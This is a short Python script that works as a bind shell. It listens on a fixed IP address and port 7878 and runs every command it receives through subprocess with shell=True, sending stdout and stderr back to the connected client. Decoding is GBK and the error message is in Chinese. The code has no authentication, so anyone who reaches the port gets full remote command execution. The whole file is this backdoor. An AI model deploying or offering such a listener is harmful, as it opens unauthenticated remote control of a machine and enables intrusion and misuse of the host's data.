import subprocess
from socket import *

s = socket()
s.bind(("192.168.34.170",7878))
s.listen(5)
new_s, addr = s.accept()

while True:
    try:

        print(addr)
        data = new_s.recv(1024)
        obj = subprocess.Popen(data.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        a = obj.stdout.read().decode("GBK")
        b = obj.stderr.read().decode("GBK")
        print(a+b)
        new_s.send((a+b).encode())
    except Exception as e:
        print("错误",e)